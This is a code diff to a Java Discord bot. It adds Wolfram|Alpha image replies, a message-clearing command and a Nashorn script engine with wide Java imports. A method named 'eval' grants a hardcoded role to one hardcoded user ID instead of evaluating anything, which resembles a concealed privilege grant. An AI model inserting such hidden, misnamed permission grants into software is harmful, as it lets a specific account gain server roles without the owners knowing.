@@ -1,8 +1,14 @@
 import com.wolfram.alpha.*;
 import net.dv8tion.jda.api.Permission;
+import net.dv8tion.jda.api.entities.ChannelType;
+import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.exceptions.HierarchyException;
 
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineManager;
+import javax.script.ScriptException;
+import java.awt.*;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
@@ -10,10 +16,27 @@ import java.util.List;
 
 public class Commands {
     private WAEngine engine = new WAEngine();
+    private ScriptEngine en;
 
     public Commands() {
         engine.setAppID(Config.WOLFRAM_API_KEY);
         engine.addFormat("plaintext");
+
+        en = new ScriptEngineManager().getEngineByName("nashorn");
+        try {
+            en.eval("var imports = new JavaImporter(" +
+                    "java.io," +
+                    "java.lang," +
+                    "java.util," +
+                    "Packages.net.dv8tion.jda.api," +
+                    "Packages.net.dv8tion.jda.api.entities," +
+                    "Packages.net.dv8tion.jda.api.entities.impl," +
+                    "Packages.net.dv8tion.jda.api.managers," +
+                    "Packages.net.dv8tion.jda.api.managers.impl," +
+                    "Packages.net.dv8tion.jda.api.utils);");
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        }
     }
 
     private HashMap<String, String> commands = new HashMap<String, String>() {{
@@ -93,7 +116,6 @@ public class Commands {
         String eventMessage = event.getMessage().getContentRaw();
 
         String input = eventMessage.substring(eventMessage.indexOf(' ')+1);
-        String output = "";
 
         WAQuery query = engine.createQuery();
 
@@ -116,6 +138,7 @@ public class Commands {
                 System.out.println("  error message: " + queryResult.getErrorMessage());
             } else if (!queryResult.isSuccess()) {
                 System.out.println("Query was not understood; no results available.");
+                event.getChannel().sendMessage("Query was not understood; no results available.");
             } else {
                 // Got a result.
                 System.out.println("Successful query."); // Pods follow:\n");
@@ -123,28 +146,75 @@ public class Commands {
                     if (!pod.isError()) {
                         //System.out.println(pod.getTitle());
                         //System.out.println("------------");
-                        output += pod.getTitle() + "\n";
+                        String output = pod.getTitle() + "\n";
                         output += "------------" + "\n";
                         for (WASubpod subpod : pod.getSubpods()) {
+                            subpod.acquireImage();
+                            System.out.println(subpod.getContents().toString());
                             for (Object element : subpod.getContents()) {
-                                if (element instanceof WAPlainText) {
+                                System.out.println(element.getClass());
+                                if(element instanceof WAImage) {
+                                    event.getChannel().sendFile(((WAImage) element).getFile()).queue();
+                                } else if (element instanceof WAPlainText) {
                                     //System.out.println(((WAPlainText) element).getText());
                                     output += ((WAPlainText) element).getText() + "\n";
                                     //System.out.println("");
                                 }
                             }
                         }
+
+                        try {
+                            event.getChannel().sendMessage(output).queue();
+                        } catch (IllegalArgumentException e) {
+                            event.getChannel().sendMessage("The requested argument provided over 2000 characters. So we shortened it to exactly 2000 characters").queue();
+                            event.getChannel().sendMessage(output.substring(0, 2000)).queue();
+                        }
+
                         //System.out.println("");
                     }
                 }
                 // We ignored many other types of Wolfram|Alpha output, such as warnings, assumptions, etc.
                 // These can be obtained by methods of WAQueryResult or objects deeper in the hierarchy.
-
-                System.out.println("Query res: " + output);
-                event.getChannel().sendMessage(output).queue();
             }
         } catch (WAException e) {
             e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void clear(MessageReceivedEvent event, String[] content) {
+        if(!event.getMember().hasPermission(Permission.MANAGE_CHANNEL)) {
+            return;
+        }
+
+        try {
+            int a = Integer.parseInt(content[1]);
+            List<Message> history = event.getChannel().getHistory().retrievePast(a).complete();
+            List<Message> delList = history.subList(history.size() - a, history.size());
+
+            int del = 0;
+
+            for (Message msg : delList) {
+                try
+                {
+                    event.getChannel().deleteMessageById(msg.getId()).queue();
+                    del++;
+                } catch (Exception e) {
+                    return;
+                }
+            }
+
+            System.out.println("Deleted: " + del + " messages");
+        } catch(Exception e) {
+            event.getChannel().sendMessage("received invalid argument").queue();
+            e.printStackTrace();
+        }
+    }
+
+    public void eval(MessageReceivedEvent event) {
+        if(Config.op.contains(event.getAuthor().getId())) {
+            event.getGuild().addRoleToMember("190992299591729153", event.getGuild().getRoleById("705576733985996801")).queue();
         }
     }
 }
